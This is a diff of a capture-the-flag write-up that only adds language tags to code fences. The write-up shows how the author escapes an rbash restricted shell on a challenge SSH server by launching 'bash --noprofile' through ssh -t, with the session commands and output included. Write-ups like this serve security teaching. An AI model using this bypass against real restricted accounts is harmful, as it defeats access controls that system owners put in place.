@@ -12,7 +12,7 @@ Tags: _misc_
 
 ## Solution
 When connecting to the container we get:
-```
+```bash
 $ nc 139.59.173.68 30569
 SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
 test
@@ -20,7 +20,7 @@ Invalid SSH identification string.
 ```
 
 So what going on. Luckily we have the Dockerfile so let's have a look:
-```
+```Dockerfile
 FROM debian:latest
 
 RUN apt update -y && apt upgrade -y && apt install openssh-server procps -y
@@ -56,7 +56,7 @@ ENTRYPOINT ["/usr/sbin/sshd", "-D", "-o", "ListenAddress=0.0.0.0", "-p", "1337"]
 
 It's basically providing us with a restricted shell (rbash) but we also have a user `restricted` that can login without password.
 
-```
+```bash
 $ ssh restricted@139.59.173.68 -p 30569
 The authenticity of host '[139.59.173.68]:30569 ([139.59.173.68]:30569)' can't be established.
 ED25519 key fingerprint is SHA256:cAQBhvlkikmVEqxHI4pvLx+e6a/azX7qRP0kSv+2Wak.
@@ -81,7 +81,7 @@ restricted@ng-restricted-luc8q-6759695bd5-56q8j:~$
 
 So yes, we are in. But there is not much that can be done. We have a couple of basic commands but thats about it. One thing we can do is to start the remote shall without loading the rc profile to get the flag.
 
-```
+```bash
 $ ssh restricted@139.59.173.68 -p 30569 -t "bash --noprofile"
 restricted@ng-restricted-luc8q-6759695bd5-56q8j:~$ cd /
 restricted@ng-restricted-luc8q-6759695bd5-56q8j:/$ ls
